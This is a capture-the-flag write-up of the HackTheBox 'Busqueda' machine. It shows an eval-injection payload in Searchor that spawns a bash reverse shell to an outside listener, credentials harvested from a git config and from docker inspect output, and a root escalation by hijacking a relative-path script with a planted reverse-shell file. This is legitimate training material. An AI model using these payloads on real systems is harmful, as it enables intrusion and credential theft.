---
title: "HackTheBox - Busqueda"
date: 2023-08-13T10:17:28-05:00
description: "Busqueda is an easy difficulty box utilizing an outdated version of the small open-source github project Searchor. By examining the pull request history for this project, we learn of an unsafe eval parameter that can be leveraged to achieve remote code execution. After thorough enumeration, we find credentials and a private hosted gitea server, which eventually allows us to view source code over a script we can run with root authority. The script will run a shell script defined by relative path, meaning we can use file path manipulation to execute our own malicious shell script as root. This leads us to obtaining full root authority."
tags: ["Unsafe eval","Github","Gitea","Docker","File Path Manipulation"]
image: "Busqueda.png"
categories: ["Hack The Box"]
---
## Enumeration
Initial nmap:
```
# Nmap 7.93 scan initiated Sun Apr  9 07:47:17 2023 as: nmap -sCV -oN nmap_initial.txt 10.129.203.183
Nmap scan report for 10.129.203.183
Host is up (0.023s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)
|_  256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://searcher.htb/
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Apr  9 07:47:26 2023 -- 1 IP address (1 host up) scanned in 9.27 seconds
```
The open port 80 suggests an http server that we can visit. However, when we try to visit by ip address we are redirected to `http://searcher.htb`. We must add this address link to are `hosts` file.
```
$ tail /etc/hosts            

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

10.10.11.208 searcher.htb
```

### Exploring the webpage

Now upon vising the site, we see the website described as being able to search anything. We are given a wide selection of search engines to use, and then we can detail our search query as well:

![Website main page](Images/SearcherMenu.png)

We also see the option to auto redirect, but at first glance I have no idea what that means.
When I select the engine `Google` and something to search, pressing the `Search` button results in the generation of  a url that we might copy/paste into our browser.

![Google Search Link](Images/GoogleSearch.png)

This is how the search engine works: you supply the engine and the query, and the webpage will generate a link that can take you to a query using that search engine. Auto-redirect probably configures you to be taken directly to the link rather than this page showing nothing but the link text.

Examining the bottom of the searcher page, we can see the web service is using Flask, and also that this searchor tool is open source:

![Webpage footer](Images/Footer.png)

Clicking on the `Searchor 2.4.0` hyperlink redirects us to a [github page](https://github.com/ArjunSharda/Searchor)

### Enumerating github pull requests and patch histories

We can see from github that this is not the most recent version of searchor, so perhaps this version might have an unpatched vulnerability? For popular vulnerabilities, we can simply google search "Service Version X.X.X exploit" and get plenty of information. However, if Searchor is not big enough it might not get the same level of attention.
In this case, it might be more fruitful to look at the version history for searchor, and see if there is any mention of patching an exploit.
We can see in the overview for v2.4.2, there is a patched vulnerability mentioned

![V2.4.2 Vulnerability Patched](Images/v242.png)

Since the webpage is still using 2.4.0, this vulnerability should still exist, if we are able to take advantage. 
When we look at the link, the details say the `search` method in the code is utilizing an unsafe `eval` operation that can allow for arbitrary code execution.

![Description of vulnerability](Images/VulnDesc.png)

To understand a little more, we can look at the code being changed in this pull request:

![change in code editing](Images/searchorcode.png)

We can see  here the two arguments we will provide the service, first being the `engine`, followed by `query`. It appears as though if we can escape the single quote wrapping around `query`, we might be able to directly call arguments in python's eval() statement.

By editing the request in burpsuite, we can see when we supply a single `'` mark, the request breaks.

![Empty response](Images/singlequot.png)

If we can supply new arguments in the proper syntax, we can achieve code execution.

## Foothold
### Obtaining shell access as user svc

After a little bit of trial and error, I managed to achieve code execution:

![Executing id](Images/idexecution.png)

In addition to the single quote, we also needed `)` to end the search function, followed by a `,` to supply a 2nd object to eval. `__import__('os').system()` is our set up for command execution, where we supply the shell command in system(). From here, a reverse shell can be obtained by searching for a bash rev shell payload:
```
asdf'),__import__('os').system('bash -c "bash -i >& /dev/tcp/10.10.14.139/8888 0>&1"') #
```
I found that this command had trouble executing from burpsuite, but has no issue if you simply return to the webpage and execute from your browser.
On a listening session:
```
$ nc -nvlp 8888
listening on [any] 8888 ...
connect to [10.10.14.139] from (UNKNOWN) [10.10.11.208] 36252
bash: cannot set terminal process group (1631): Inappropriate ioctl for device
bash: no job control in this shell
svc@busqueda:/var/www/app$ id
id
uid=1000(svc) gid=1000(svc) groups=1000(svc)
```
From here, we can grab the `user.txt` file.

### Enumerating the webserver's git details

When exploring the web file system, we see a `.git` folder in the web root directory:
```
svc@busqueda:/var/www/app$ ls -al
ls -al
total 20
drwxr-xr-x 4 www-data www-data 4096 Apr  3 14:32 .
drwxr-xr-x 4 root     root     4096 Apr  4 16:02 ..
-rw-r--r-- 1 www-data www-data 1124 Dec  1  2022 app.py
drwxr-xr-x 8 www-data www-data 4096 Aug 14 00:07 .git
drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 templates
```
We know this service originally came from a public `git` repo, but it is a little surprising to see the iconic `.git` folder when file layout does not at all match with the git repo. When viewing Searchor 2.4.0, this is what the repo looks like:

![Searchor files](Images/240_repo.png)


A lot of the files have been removed, changed, renamed, or other. However, exploring a little deeper, we can start to see what might be going on:
```
svc@busqueda:/var/www/app/.git$ cat logs/HEAD
cat logs/HEAD
0000000000000000000000000000000000000000 5ede9ed9f2ee636b5eb559fdedfd006d2eae86f4 administrator <administrator@gitea.searcher.htb> 1671970461 +0000     commit (initial): Initial commit
```
When examining the current commit id, we can see the `.git` is not even associated with the github page Searchor. Instead, it looks like `administrator` built this webpage personally, utilizing Searchor 2.4.0 code, then created a new git repository with `Gitea` instead!  [Gitea is a git-based service that can be self-hosted](https://about.gitea.com/). Its purpose is similar to [Github](https://github.com/), but with the option for completely private hosting it allows for a much more isolated development workflow that might never leave a company's infrastructure.

The new subdomain is particularly interesting, `gitea.searcher.htb`. Perhaps if we add this to our /etc/hosts file, we might view it ourselves?
```
$ tail /etc/hosts

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

10.10.11.208 searcher.htb gitea.searcher.htb
```
Viewing the website:

![Gitea home page](Images/giteahome.png)

Searching around, we can see users `administrator` and `cody`, but no repositories are publicly viewable.

![Gitea Users](Images/giteausers.png)

### Finding credentials and testing for password re-use

When looking back at the `.git/config` file, we can find credentials:
```
svc@busqueda:/var/www/app/.git$ cat config
cat config
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[remote "origin"]
        url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
        fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
        remote = origin
        merge = refs/heads/main
```

We can see in plaintext, cody's password of `jh1usoih2bkjaspwe92`. If there were a user named `cody` on the system, my first thought would be to check `su` to see if i can change my shell user to cody. However, only user `svc` exists on the box. Still, it might be that user svc was set up by cody, using the same password? It is worth a try, since it costs nothing:
```
svc@busqueda:/var/www/app/.git$ sudo -l
[sudo] password for svc: 
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```
I used `sudo -l` to get the password check for `svc`, and not only did it work, but we also seem to have a sudo command we can run as root!
Another check we might have done is to `ssh` in as `svc`. We can still do so, and now we know it will work:
```
$ ssh svc@searcher.htb
svc@searcher.htb's password: 
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-69-generic x86_64)
<...SNIP...>
svc@busqueda:~$
```
Before forgetting about it, the password needs to be checked on the original service as well: the gitea page. It does indeed work, and there is one repository now viewable:

![Logged in as cody](Images/SearcherRepo.png)

### Enumerating svc's sudo actions

Checking out the system-checkup script:
```
svc@busqueda:~$ ls -al /opt/scripts/system-checkup.py 
-rwx--x--x 1 root root 1903 Dec 24  2022 /opt/scripts/system-checkup.py
```
We cannot write over the file, so the exploit must come from abusing what the file does. Also, we cannot read the file, so we must figure out what is going on by running the script.

```
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py *
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup
```

It appears to be referencing docker containers running on the system. To start, let's check `docker-ps`:

```
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
CONTAINER ID   IMAGE                COMMAND                  CREATED        STATUS        PORTS                                             NAMES
960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   7 months ago   Up 15 hours   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   7 months ago   Up 15 hours   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db
```

We see two containers, interestingly another gitea container? Or is this perhaps the same on we just looked at? I am not familiar enough with docker to know. Next, I try docker-inspect, and use the container ID of the gitea container, `960873171e2e`:

```
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect 960873171e2e
Usage: /opt/scripts/system-checkup.py docker-inspect <format> <container_name>
```

I have no idea what format options are possible, so I have to read up on what this command can do. `docker-inspect` is a commonly conserved docker command, so [there is an entire webpage explaining it](https://docs.docker.com/engine/reference/commandline/inspect/). Looking at some examples, I'm hoping I can specify something like this command to output all details:
```
docker inspect --format='{{json .Config}}' $INSTANCE_ID
```
Running the command and beautifying the output:
```
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .Config}}' 960873171e2e
{
  "Hostname": "960873171e2e",
  "Domainname": "",
  "User": "",
  "AttachStdin": false,
  "AttachStdout": false,
  "AttachStderr": false,
  "ExposedPorts": {
    "22/tcp": {},
    "3000/tcp": {}
  },
  "Tty": false,
  "OpenStdin": false,
  "StdinOnce": false,
  "Env": [
    "USER_UID=115",
    "USER_GID=121",
    "GITEA__database__DB_TYPE=mysql",
    "GITEA__database__HOST=db:3306",
    "GITEA__database__NAME=gitea",
    "GITEA__database__USER=gitea",
    "GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh",
    "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
    "USER=git",
    "GITEA_CUSTOM=/data/gitea"
  ],
  "Cmd": [
    "/bin/s6-svscan",
    "/etc/s6"
  ],
  "Image": "gitea/gitea:latest",
  "Volumes": {
    "/data": {},
    "/etc/localtime": {},
    "/etc/timezone": {}
  },
  "WorkingDir": "",
  "Entrypoint": [
    "/usr/bin/entrypoint"
  ],
  "OnBuild": null,
  "Labels": {
    "com.docker.compose.config-hash": "e9e6ff8e594f3a8c77b688e35f3fe9163fe99c66597b19bdd03f9256d630f515",
    "com.docker.compose.container-number": "1",
    "com.docker.compose.oneoff": "False",
    "com.docker.compose.project": "docker",
    "com.docker.compose.project.config_files": "docker-compose.yml",
    "com.docker.compose.project.working_dir": "/root/scripts/docker",
    "com.docker.compose.service": "server",
    "com.docker.compose.version": "1.29.2",
    "maintainer": "maintainers@gitea.io",
    "org.opencontainers.image.created": "2022-11-24T13:22:00Z",
    "org.opencontainers.image.revision": "9bccc60cf51f3b4070f5506b042a3d9a1442c73d",
    "org.opencontainers.image.source": "https://github.com/go-gitea/gitea.git",
    "org.opencontainers.image.url": "https://github.com/go-gitea/gitea"
  }
}
```

There is a lot of information that is tricky to follow, but I'm hoping the most notable information is the new password displayed in the `GITEA__database__` segment: `yuiu1hoiu4i5ho1uh`

From here we can enter the mysql database as gitea, and see that there is not much information available.

Since passwords were re-used before, my first thought is to try this password as the root user on the machine?

```
svc@busqueda:~$ su
Password: 
su: Authentication failure
```
It does not work. However, when I return to the gitea webpage and use this credential for user administrator, the password is accepted!


![Logged in as administrator](Images/administratorlogin.png)

## Privilege Escalation
### Reading system-checkup.py source code

Now under scripts, we can see what is likely the `system-checkup.py` we had been executing:

![Scripts Repository](Images/scripts.png)

With the source code in hand, we can clearly see a very serious oversight in the code:
```
    elif action == 'full-checkup':
        try:
            arg_list = ['./full-checkup.sh']
            print(run_command(arg_list))
            print('[+] Done!')
        except:
            print('Something went wrong')
            exit(1)
```
When running full-checkup, the `full-checkup.sh` is not using the absolute path. Meaning, we can create our own `full-checkup.sh` in a current working directory, execute full-checkup as root, and our own `full-checkup.sh` will be ran instead.

### Abusing File Path Manipulation
First I enter a directory where i can write files:
```
svc@busqueda:~$ cd /dev/shm
svc@busqueda:/dev/shm$
```
Next, I create a simple reverse shell script under the name `full-checkup.sh`:
```
svc@busqueda:/dev/shm$ cat full-checkup.sh 
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.139/8888 0>&1
```
On my kali machine, I set up a listener:
```
$ nc -nvlp 8888
listening on [any] 8888 ...
```
And finally, I run the sudo command:
```
svc@busqueda:/dev/shm$ chmod +x full-checkup.sh 
svc@busqueda:/dev/shm$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
```
Back on my listening session:
```
$ nc -nvlp 8888
listening on [any] 8888 ...
connect to [10.10.14.139] from (UNKNOWN) [10.10.11.208] 60866
root@busqueda:/dev/shm# id
id
uid=0(root) gid=0(root) groups=0(root)
root@busqueda:/dev/shm#
```
Now we are root, and `root.txt` is up for grabs.
## Reflection
I quite enjoyed this box, being a rather relaxed set of obstacles while not giving anythinig away for free. Finding the web server so strikingly different from Searchor was a little disorienting, but it makes sense that some modifications would be made to translate Searchor, a cli=based project, into something that a web server can handle for visitors.
